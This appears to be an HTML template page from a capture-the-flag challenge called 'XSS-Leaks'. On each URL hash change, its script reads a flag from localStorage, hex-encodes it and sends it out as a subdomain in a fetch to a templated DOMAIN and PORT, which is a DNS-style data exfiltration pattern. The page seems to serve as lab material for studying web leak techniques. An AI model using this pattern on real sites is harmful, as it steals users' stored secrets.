<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XSS-Leaks!!</title>
</head>
<body>
  <p id="result">XSS_Leaks!!</p>

  <script nonce="<%= nonce %>">
    const DOMAIN = '<%= DOMAIN %>';
    const PORT = '<%= PORT %>';
    const result = document.getElementById('result');

    const toHex = (value) =>
      [...new TextEncoder().encode(value)]
        .map((byte) => byte.toString(16).padStart(2, '0'))
        .join('');

    window.addEventListener('hashchange', () => {
      const flag = localStorage.getItem('flag');
      if (!flag) {
        result.innerText = 'flag missing';
        return;
      }

      // The raw flag cannot be used as a hostname label because characters like
      // `{` and `}` are invalid in subdomains, so the victim encodes it first.
      const flagSubdomain = toHex(flag);

      fetch(`http://${flagSubdomain}.${DOMAIN}:${PORT}`)
        .finally(() => {
          result.innerText = 'request sent';
        });
    });
  </script>
</body>
</html>
